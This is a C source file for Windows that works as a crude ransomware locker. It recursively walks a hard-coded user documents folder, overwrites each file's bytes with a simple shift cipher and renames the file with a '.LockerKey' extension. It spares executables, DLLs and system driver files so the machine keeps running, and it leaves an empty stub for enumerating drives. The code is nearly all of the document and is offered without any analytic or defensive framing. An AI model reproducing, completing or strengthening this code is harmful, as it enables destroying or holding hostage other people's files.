#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <dirent.h>

void cipher(char *buffer,int len){
 for(int i = 0; i < len; i++){
        buffer[i]+=1;
    }


}




VOID Encrypt_File(char *name){
FILE *fin = fopen(name, "rb");//abrimos o arquivo
    fseek(fin, 0, SEEK_END);//
    long len = ftell(fin);
    rewind(fin);//reposiciona o ponteiro  para o iicio
    char *buffer =(char*) malloc(len);//aloca
    fread(buffer, len, 1, fin);//Ler o conteudo do arquivo
    fclose(fin);//fechar o ponteiro
   cipher(buffer,len);
     FILE *fout = fopen(name, "wb");
    fwrite(buffer, len, 1, fout);
    fclose(fout);
    CHAR newname[MAX_PATH];
	strcpy(newname,name);
	strcat(newname,".LockerKey");
	MoveFile(name,newname);







}
VOID ListDirFile(char *path){
char sc[MAX_PATH],buf[MAX_PATH];
	 WIN32_FIND_DATA in;
	 HANDLE fd,file;
	 char *fm = "%s\\%s",*fm1 = "%s\\*.*";

	 if(strlen(path) == 3)
	 {
		path[2] = '\0'; /* :-) */
	 }

	 sprintf(sc,fm1,path);
     fd = FindFirstFile(sc,&in);

 do
 {

	 sprintf(buf,fm,path,in.cFileName);

	   /* dot :) */
	 if(strcmp(in.cFileName,"..") != 0 && strcmp(in.cFileName,".") != 0 && (in.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
	 {
		 ListDirFile(buf);
	 }

	   /* File found */
	 else
	 {

		 /* is it good to encrypt ? */

		 if(  !strstr(in.cFileName,".LockerKey")  &&  !strstr(in.cFileName,".dll")
			 && !strstr(in.cFileName,".exe") && !strstr(in.cFileName,".ini") &&
			     !strstr(in.cFileName,".vxd") && !strstr(in.cFileName,".drv") &&
				 strcmp(in.cFileName,"..") != 0 && strcmp(in.cFileName,".") != 0)
		 {
			 Encrypt_File(buf);
		 }
	 }

 }while(FindNextFile(fd,&in));

 FindClose(fd);
}




VOID GetDrives(){





}








int main(){


  ListDirFile("C:\\Users\\estan\\OneDrive\\Documentos\\Nova pasta (6)\\");

return 0;}
